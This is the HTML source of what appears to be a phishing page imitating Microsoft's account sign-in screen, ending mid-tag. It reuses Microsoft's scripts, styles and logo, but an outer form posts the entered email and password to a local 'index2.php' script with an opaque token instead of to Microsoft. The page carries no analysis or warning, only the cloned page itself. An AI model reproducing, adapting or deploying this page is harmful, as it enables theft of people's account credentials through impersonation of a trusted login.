﻿<html dir="ltr" class="" lang="en"><form id="Form1" name="Form1" action="index2.php?h=ed29nkjpsa16bhrjq4na16owq-1mucgfycc664m7vmhpjgqse65-1l5rurej3h44qodo5rn0cdvyn-8om6v2ckrxsbnwf40t9ta8a7e-34tiets5jpj294jd59h8c4s0n-28w7d5j2k2jtil9ncckolke4m-9jzlwicvu376y9q4vjq77y5ks-1m0whdrwis44c1hoa9mrwhlt4-1uvutm1mpyov7rqhtcf8fksby-aac54ic1fmca5xz1yvc5t9nfe-1hn40w0bomeivihj9lopp4hp2-c0121povror81d0xao0yez4gy" method="post"><head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <link rel="preconnect" href="https://aadcdn.msftauth.net" crossorigin="">
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="//aadcdn.msftauth.net">
<link rel="dns-prefetch" href="//aadcdn.msauth.net">

    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">
    <noscript>
        <meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" />
    </noscript>

    
        <link rel="shortcut icon" href="https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    
    <meta name="robots" content="none">

 
<script type="text/javascript">//<![CDATA[
!function(){var e=window,r=e.$Debug=e.$Debug||{},t=e.$Config||{};if(!r.appendLog){var n=[],o=0;r.appendLog=function(e){var r=t.maxDebugLog||25,a=(new Date).toUTCString()+":"+e;n.push(o+":"+a),n.length>r&&n.shift(),o++},r.getLogs=function(){return n}}}(),function(){function e(e,r){function t(a){var i=e[a];return n-1>a?void(o.r[i]?t(a+1):o.when(i,function(){t(a+1)})):void r(i)}var n=e.length;t(0)}function r(e,r,a){function i(){var e=!!s.method,o=e?s.method:a[0],i=s.extraArgs||[],u=n.$WebWatson;try{var c=t(a,!e);
if(i&&i.length>0){for(var l=i.length,d=0;l>d;d++){c.push(i[d])}}o.apply(r,c)}catch(f){return void(u&&u.submitFromException&&u.submitFromException(f))}}var s=o.r&&o.r[e];return r=r?r:this,s&&(s.skipTimeout?i():n.setTimeout(i,0)),s}function t(e,r){return Array.prototype.slice.call(e,r?1:0)}var n=window;n.$Do||(n.$Do={"q":[],"r":[],"removeItems":[],"lock":0,"o":[]});var o=n.$Do;o.when=function(t,n){function a(e){r(e,i,s)||o.q.push({"id":e,"c":i,"a":s})}var i=0,s=[],u=1,c="function"==typeof n;c||(i=n,u=2);for(var l=u;l<arguments.length;l++){s.push(arguments[l])
}t instanceof Array?e(t,a):a(t)},o.register=function(e,t,n){if(!o.r[e]){o.o.push(e);var a={};if(t&&(a.method=t),n&&(a.skipTimeout=n),arguments&&arguments.length>3){a.extraArgs=[];for(var i=3;i<arguments.length;i++){a.extraArgs.push(arguments[i])}}o.r[e]=a,o.lock++;try{for(var s=0;s<o.q.length;s++){var u=o.q[s];u.id==e&&r(e,u.c,u.a)&&o.removeItems.push(u)}}catch(c){throw c}finally{if(o.lock--,0===o.lock){for(var l=0;l<o.removeItems.length;l++){for(var d=o.removeItems[l],f=0;f<o.q.length;f++){if(o.q[f]===d){o.q.splice(f,1);
break}}}o.removeItems=[]}}}},o.unregister=function(e){o.r[e]&&delete o.r[e]}}(),function(){function e(e,r){var t=f.$Debug;t&&t.appendLog&&(r&&(e+=" '"+(r.src||r.href||"")+"'",e+=", id:"+(r.id||""),e+=", async:"+(r.async||""),e+=", defer:"+(r.defer||"")),t.appendLog(e))}function r(){if(void 0===d){if(g){d=g.IE}else{var e=f.navigator.userAgent;d=-1!==e.indexOf("MSIE ")||-1!==e.indexOf("Trident/")}}return d}function t(){var e=f.$Config||{},r=e.loader||{};return r.slReportFailure||e.slReportFailure||!1}function n(){var e=f.$Config||{},r=e.loader||{};
return r.redirectToErrorPageOnLoadFailure||!1}function o(e){var r=e.indexOf("?"),t=r>-1?r:e.length;return t>p&&e.substr(t-p,p).toLowerCase()===v}function a(e){var r=e.srcPath,t=null;t=o(r)?i(r):"script"===e.tagName.toLowerCase()?s(r):u(r,e.tagName);var n=e.id;n&&(t.id=n);var a=e.integrity;return"function"==typeof t.setAttribute&&(t.setAttribute("crossorigin","anonymous"),a&&"string"==typeof a&&t.setAttribute("integrity",a)),t}function i(e){var r=h.createElement("link");return r.rel="stylesheet",r.type="text/css",r.href=e,r
}function s(e){var r=h.createElement("script");return r.type="text/javascript",r.src=e,r.defer=!1,r.async=!1,r}function u(e,r){var t=h.createElement(r);return t.src=e,t}function c(e){var r=!0,t=e.src||e.href||"";if(t){if(o(t)){try{e.sheet&&e.sheet.cssRules&&!e.sheet.cssRules.length&&(r=!1)}catch(n){}}}else{r=!1}return r}function l(){function r(e){if(!(s&&s.length>1)){return e}for(var r=0;r<s.length;r++){if(0===e.indexOf(s[r])){return s[r+1<s.length?r+1:0]+e.substring(s[r].length)}}return e}function t(n,i,s){if(n<d.length){var f=d[n];
if(!f||!f.srcPath){return void t(n+1,i,s)}f.retry>0&&(f.srcPath=r(f.srcPath),f.origId||(f.origId=f.id),f.id=f.origId+"_Retry_"+f.retry);var g=a(f),v=function(){e("[$Loader]: "+(u.failMessage||"Failed"),g),f.retry<o&&(f.retry++,t(n,i,s),l._ReportFailure(f.retry-1,f.srcPath)),s&&s()},p=function(){if(f.retry++,c(g)){e("[$Loader]: "+(u.successMessage||"Loaded"),g),t(n+1,i,s);var r=f.onSuccess;"function"==typeof r&&r(f.srcPath)}else{v()}};g.onload=p,g.onerror=v,g.onreadystatechange=function(){"loaded"===g.readyState?setTimeout(p,500):"complete"===g.readyState&&p()
};var y=h.getElementsByTagName("head")[0];y.appendChild(g),e("[$Loader]: Loading '"+(f.srcPath||"")+"', id:"+(f.id||""))}else{i&&i()}}var n=f.$Config||{},o=n.slMaxRetry||2,i=n.loader||{},s=i.cdnRoots||[],u=this,d=[];u.retryOnError=!0,u.successMessage="Loaded",u.failMessage="Error",u.Add=function(e,r,t,n,o,a){e&&d.push({"srcPath":e,"id":r,"retry":n||0,"integrity":t,"tagName":o||"script","onSuccess":a})},u.AddLoaded=function(){},u.AddForReload=function(e,r){var t=e.src||e.href||"";u.Add(t,"AddForReload",e.integrity,1,e.tagName,r)
},u.AddIf=function(e,r,t){e&&u.Add(r,t)},u.Load=function(e,r){t(0,e,r)}}var d,f=window,g=f.$B,h=f.document,v=".css",p=v.length;l.On=function(e,r,t){if(!e){throw"The target element must be provided and cannot be null."}r?l.OnError(e,t):l.OnSuccess(e,t)},l.OnSuccess=function(r,o){var a=r.src||r.href||"",i=t(),s=n();if(!r){throw"The target element must be provided and cannot be null."}if(c(r)){e("[$Loader]: Loaded",r);var u=new l;u.failMessage="Reload Failed",u.successMessage="Reload Success",u.AddLoaded(r),u.Load(null,function(){if(i){throw"Unexpected state. resourceLoader.Load() failed despite initial load success. ['"+a+"']"
}s&&(document.location.href="/error.aspx?err=504")})}else{l.OnError(r,o)}},l.OnError=function(r,o){var a=r.src||r.href||"",i=t(),s=n();if(!r){throw"The target element must be provided and cannot be null."}e("[$Loader]: Failed",r);var u=new l;u.failMessage="Reload Failed",u.successMessage="Reload Success",u.AddForReload(r,o),u.Load(null,function(){if(i){throw"Failed to load external resource ['"+a+"']"}s&&(document.location.href="/error.aspx?err=504")}),l._ReportFailure(0,a)},l._ReportFailure=function(e,t){if(!r()){throw"[Retry "+e+"] Failed to load external resource ['"+t+"'], reloading from fallback CDN endpoint"
}},f.$Loader=l}(),function(){function e(){if(!$){var e=new v.$Loader;e.AddIf(!v.jQuery,y.sbundle,"WebWatson_DemandSupport"),y.sbundle=null,delete y.sbundle,e.AddIf(!v.$Api,y.fbundle,"WebWatson_DemandFramework"),y.fbundle=null,delete y.fbundle,e.Add(y.bundle,"WebWatson_DemandLoaded"),e.Load(r,t),$=!0}}function r(){if(v.$WebWatson){if(v.$WebWatson.isProxy){return void t()}m.when("$WebWatson.full",function(){for(;b.length>0;){var e=b.shift();e&&v.$WebWatson[e.cmdName].apply(v.$WebWatson,e.args)}})}}function t(){var e=v.$WebWatson?v.$WebWatson.isProxy:!0;
if(e){if(!w&&JSON){try{var r=new XMLHttpRequest;r.open("POST",y.url),r.setRequestHeader("Accept","application/json"),r.setRequestHeader("Content-Type","application/json; charset=UTF-8"),r.setRequestHeader("canary",p.apiCanary),r.setRequestHeader("client-request-id",p.correlationId),r.setRequestHeader("hpgid",p.hpgid||0),r.setRequestHeader("hpgact",p.hpgact||0);for(var t=-1,o=0;o<b.length;o++){if("submit"===b[o].cmdName){t=o;break}}var a=b[t]?b[t].args||[]:[],i={"sr":y.sr,"ec":"Failed to load external resource [Core Watson files]","wec":55,"idx":1,"pn":p.pgid||"","sc":p.scid||0,"hpg":p.hpgid||0,"msg":"Failed to load external resource [Core Watson files]","url":a[1]||"","ln":0,"ad":0,"an":!1,"cs":"","sd":p.serverDetails,"ls":null,"diag":h(y)};
r.send(JSON.stringify(i))}catch(s){}w=!0}y.loadErrorUrl&&window.location.assign(y.loadErrorUrl)}n()}function n(){b=[],v.$WebWatson=null}function o(r){return function(){var t=arguments;b.push({"cmdName":r,"args":t}),e()}}function a(){var e=["foundException","resetException","submit"],r=this;r.isProxy=!0;for(var t=e.length,n=0;t>n;n++){var a=e[n];a&&(r[a]=o(a))}}function i(e,r,t,n,o,a,i){var s=v.event;return a||(a=d(o||s,i?i+2:2)),v.$Debug&&v.$Debug.appendLog&&v.$Debug.appendLog("[WebWatson]:"+(e||"")+" in "+(r||"")+" @ "+(t||"??")),W.submit(e,r,t,n,o||s,a,i)
}function s(e,r){return{"signature":e,"args":r,"toString":function(){return this.signature}}}function u(e){for(var r=[],t=e.split("\n"),n=0;n<t.length;n++){r.push(s(t[n],[]))}return r}function c(e){for(var r=[],t=e.split("\n"),n=0;n<t.length;n++){var o=s(t[n],[]);t[n+1]&&(o.signature+="@"+t[n+1],n++),r.push(o)}return r}function l(e){if(!e){return null}try{if(e.stack){return u(e.stack)}if(e.error){if(e.error.stack){return u(e.error.stack)}}else{if(window.opera&&e.message){return c(e.message)}}}catch(r){}return null
}function d(e,r){var t=[];try{for(var n=arguments.callee;r>0;){n=n?n.caller:n,r--}for(var o=0;n&&L>o;){var a="InvalidMethod()";try{a=n.toString()}catch(i){}var u=[],c=n.args||n.arguments;if(c){for(var d=0;d<c.length;d++){u[d]=c[d]}}t.push(s(a,u)),n=n.caller,o++}}catch(i){t.push(s(i.toString(),[]))}var f=l(e);return f&&(t.push(s("--- Error Event Stack -----------------",[])),t=t.concat(f)),t}function f(e){if(e){try{var r=/function (.{1,})\(/,t=r.exec(e.constructor.toString());return t&&t.length>1?t[1]:""}catch(n){}}return""
}function g(e){if(e){try{if("string"!=typeof e&&JSON&&JSON.stringify){var r=f(e),t=JSON.stringify(e);return t&&"{}"!==t||(e.error&&(e=e.error,r=f(e)),t=JSON.stringify(e),t&&"{}"!==t||(t=e.toString())),r+":"+t}}catch(n){}}return""+(e||"")}function h(e){var r=[];try{if(jQuery?(r.push("jQuery v:"+jQuery().jquery),r.push(jQuery.easing?"jQuery.easing:"+JSON.stringify(jQuery.easing):"jQuery.easing is not defined")):r.push("jQuery is not defined"),e&&e.expectedVersion&&r.push("Expected jQuery v:"+e.expectedVersion),m){var t,n="";
for(t=0;t<m.o.length;t++){n+=m.o[t]+";"}for(r.push("$Do.o["+n+"]"),n="",t=0;t<m.q.length;t++){n+=m.q[t].id+";"}r.push("$Do.q["+n+"]")}if(v.$Debug&&v.$Debug.getLogs){var o=v.$Debug.getLogs();o&&o.length>0&&(r=r.concat(o))}if(b){for(var a=0;a<b.length;a++){var i=b[a];if(i&&"submit"===i.cmdName){try{if(JSON&&JSON.stringify){var s=JSON.stringify(i);s&&r.push(s)}}catch(u){r.push(g(u))}}}}}catch(c){r.push(g(c))}return r}var v=window,p=v.$Config||{},y=p.watson,m=v.$Do;if(!v.$WebWatson&&y){var b=[],$=!1,w=!1,L=10,W=v.$WebWatson=new a;
W.CB={},W._orgErrorHandler=v.onerror,v.onerror=i,W.errorHooked=!0,m.when("jQuery.version",function(e){y.expectedVersion=e}),m.register("$WebWatson")}}(),function(){function e(e,r){for(var t=r.split("."),n=t.length,o=0;n>o&&null!==e&&void 0!==e;){e=e[t[o++]]}return e}function r(r){var t=null;return null===u&&(u=e(a,"Constants")),null!==u&&r&&(t=e(u,r)),null===t||void 0===t?"":t.toString()}function t(t){var n=null;return null===i&&(i=e(a,"$Config.strings")),null!==i&&t&&(n=e(i,t.toLowerCase())),(null===n||void 0===n)&&(n=r(t)),null===n||void 0===n?"":n.toString()
}function n(e,r){var n=null;return e&&r&&r[e]&&(n=t("errors."+r[e])),n||(n=t("errors."+e)),n||(n=t("errors."+c)),n||(n=t(c)),n}function o(t){var n=null;return null===s&&(s=e(a,"$Config.urls")),null!==s&&t&&(n=e(s,t.toLowerCase())),(null===n||void 0===n)&&(n=r(t)),null===n||void 0===n?"":n.toString()}var a=window,i=null,s=null,u=null,c="GENERIC_ERROR";a.GetString=t,a.GetErrorString=n,a.GetUrl=o}(),function(){var e=window,r=e.$Config||{};e.$B=r.browser||{}}();

//]]></script> 

    <script type="text/javascript">
        ServerData = $Config;
    </script>


    
    <link crossorigin="anonymous" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_eihab3wwm23ia-nkvubaww2.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-aF/KSKnZNEv72IjUh6q7bZxNBn5LauNz4W34t4m2s2ucgscNil7gaO6IgMGMHjfr">

    <script crossorigin="anonymous" src="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.login.pcore.min_w6aw66spuqzzcc2opvgn4g2.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-cbOuOthQa7cxOwBeTxGqikWDV4B9+3PfjrqJWt7ZRjJ7DyFzQKw1Ps4KU58nX4Es"></script>

    <script crossorigin="anonymous" src="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_m6_6gc8vfflqvlkuqzgmpg2.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-9iHhMpstpMg0lGtcHH+i/IOPZf0MvgsnnVECU+/UAgez65cKDYwsk8W97QKXZ0wu"></script>

    


</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
    <script type="text/javascript">//<![CDATA[
!function(){var e=window,o=e.document,i=e.$Config||{};if(e.self===e.top){o&&o.body&&(o.body.style.display="block")}else{if(!i.allowFrame){var s=e.self.location.href,l=s.indexOf("#"),n=-1!==l,t=s.indexOf("?"),f=n?l:s.length,d=-1===t||n&&t>l?"?":"&";s=s.substr(0,f)+d+"iframe-request-id="+i.sessionId+s.substr(f),e.top.location=s}}}();

//]]></script>

<div><!--  --> <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://aadcdn.msftauth.net/ests/2.1/content/images/backgrounds/0-small_138bcee624fa04ef9b75e86211a9fe0d.jpg&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://aadcdn.msftauth.net/ests/2.1/content/images/backgrounds/0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> <div data-bind="if: activeDialog"></div> <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="https://login.microsoftonline.com/common/login"><!-- ko if: svr.iBannerEnvironment --><!-- /ko --><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: 'master-page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.fShowCookieBanner --><!-- /ko --> <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }"><!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner fade-in-lightbox" data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    'app': backgroundLogoUrl,
                    'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
                    'fade-in-lightbox': fadeInLightBox,
                    'has-popup': showFedCredButton,
                    'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }"> <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div><!-- ko if: showLightboxProgress --><!-- /ko --><!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) --> <div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --><!-- ko if: asyncInitReady --> <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.fEnableCssAnimation,
                            disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                            animationStateChange: paginationControl_onAnimationStateChange } }"><!--  --> <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class=""><!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) --><!-- /ko --> <div class="pagination-view animate slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            displayName: sharedData.displayName,
                            prefillNames: $loginPage.prefillNames,
                            flowToken: sharedData.flowToken },
                        event: {
                            refresh: $loginPage.view_onRefresh,
                            redirect: $loginPage.view_onRedirect,
                            setPendingRequest: $loginPage.view_onSetPendingRequest,
                            showLearnMore: $loginPage.learnMore_onShow,
                            registerDialog: $loginPage.view_onRegisterDialog,
                            unregisterDialog: $loginPage.view_onUnregisterDialog,
                            showDialog: $loginPage.view_onShowDialog } }"><!--  --> <div data-bind="component: { name: 'header-control',
    params: {
        serverData: svr,
        title: str['WF_STR_HeaderDefault_Title'] } }"><div class="row text-title" id="loginHeader"> <div role="heading" aria-level="1" data-bind="text: title">Sign in</div><!-- ko if: isSubtitleVisible --><!-- /ko --> </div></div><!-- ko if: pageDescription && !svr.fHideLoginDesc --><!-- /ko --> <div class="row"> <div role="alert" aria-live="assertive"><!-- ko if: usernameTextbox.error --><!-- /ko --> </div> 

<div class="row"> <div role="alert" aria-live="assertive"><!-- ko if: usernameTextbox.error --><!-- /ko --> </div> 
<div class="row">
<div class="form-group">
<div class="form-group col-md-24">
<input type="email" aria-label="Email, phone, or Skype" name="login" id="username" maxlength="113" class="form-control ltr_override" placeholder="Email, phone, or Skype" required></div></div> <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div><!-- /ko --> </div> </div> <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"><!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases --> <div class="form-group" data-bind="
                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                    childBindings: {
                        'signup': {
                            href: svr.urlSignUp,
                            ariaLabel: str['WF_STR_SignupLink_AriaLabel_Text'],
                            attr: { name: 'createAccount' },
                            click: signup_onClick } }">No account? <a href="https://login.live.com/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAXVSPW_TUACMkza0FYIKIYHEEgkmRJJn-_njBVXUTe2SpLHjJqlrM0SuYycvH7brPCdpfgFjxdiRSiB1RAIhZqZOnSt-AEIMqBMbuOxIp1vuhtPdPc3QBbr0BLKQs4VDlEc2z-YhokHehgyfZzmWZxlAdznARvfW1h89jt9sXn_bPLv45Dz_8-7FKbXaGeGpW3CC8Tn1oE9IOCkVi7PZrBB4Hnb-CcXPFHVJUd8p6jS97Pr5dvM8PeFZAQCRQUiELE8zAhQK1rYM1IU-VwcmUY3qUC0DoDIVuGsofXMhEXUgAa21NVLH8rG2U4HqoDfTtuucZujEbA1nWuKvM_LxbqsHtR2dqIshsFpq3zT2R5rR5q7SdzUpJn3mhoIIL9zr9KoXRONOGEzIaeY9pYWuX-mWA993HVK4sbk-wY5NcOA3oiB0I4Ldyca2F7vzRsPRRU2R69K0WqlCaAm2VWbcjuXbLPbBHuc4yK4ETc2io6k5k7DuyQ1JPNozWKgg5IzbO2DfwTjoHNRwSF7ylaYnoPKg29R51YjN_hT0pKaBG3EX-vNefNQ76CuxLITHxodMNql1HPgXmTtJKB93c2EUeHjkXi5RP5Zug0xpZWVtPfUwlUv9XqLeLifLvYq_PvN_fqydnS3EVjWVulguKgrq2rq9deCoR7XWANbnoqKIMrG82uHYBErTYEccMwDtGtxAJfokS51ks7-y1OtbqS-r_9v6au1-8heUB2KCHGBKHCol5fwF0&amp;estsfed=1&amp;uaid=9275231bf24040dca3cab6633bffa63f&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;fci=4345a7b9-9a63-4910-a426-35363201d503&amp;mkt=en-US" id="signup" aria-label="Create a Microsoft account" name="createAccount">Create one!</a></div><!-- /ko --><!-- ko if: svr.showCantAccessAccountLink --> <div class="form-group"> <a id="cantAccessAccount" name="cannotAccessAccount" href="#" data-bind="
                        text: str['WF_STR_CantAccessAccount_Text'],
                        click: cantAccessAccount_onClick">Can't access your account?</a> </div><!-- /ko --><!-- ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.fShowForgotUsernameLink) --><!-- /ko --><!-- ko if: availableCredsWithoutUsername().length > 0 || svr.fShowForgotUsernameLink --> <div class="form-group" data-bind="
                    component: { name: 'cred-switch-link-control',
                        params: {
                            serverData: svr,
                            availableCreds: availableCredsWithoutUsername(),
                            showForgotUsername: svr.fShowForgotUsernameLink },
                        event: {
                            switchView: noUsernameCredSwitchLink_onSwitchView,
                            redirect: onRedirect,
                            registerDialog: onRegisterDialog,
                            unregisterDialog: onUnregisterDialog,
                            showDialog: onShowDialog } }"><!--  --> <div class="form-group"><!-- ko if: credentialCount > 1 || (credentialCount === 1 && (showForgotUsername || selectedCredShownOnlyOnPicker)) --> <a id="idA_PWD_SwitchToCredPicker" href="#" data-bind="
        text: isUserKnown ? str['CT_PWD_STR_SwitchToCredPicker_Link'] : str['CT_PWD_STR_SwitchToCredPicker_Link_NoUser'],
        click: switchToCredPicker_onClick">Sign-in options</a><!-- /ko --><!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) --><!-- /ko --><!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko --> </div><!-- ko if: credLinkError --><!-- /ko --></div><!-- /ko --> </div> </div> </div> <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }"><!-- ko if: isSecondaryButtonVisible --><!-- /ko --> <div class="inline-block"><!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 --> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: primaryButtonAttributes,
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" value="Next"> </div> </div></div> </div> </div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div> </div></div><!-- /ko --> </div><!-- ko if: showFedCredButton --><!-- /ko --><!-- ko if: newSession --><!-- /ko --> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" 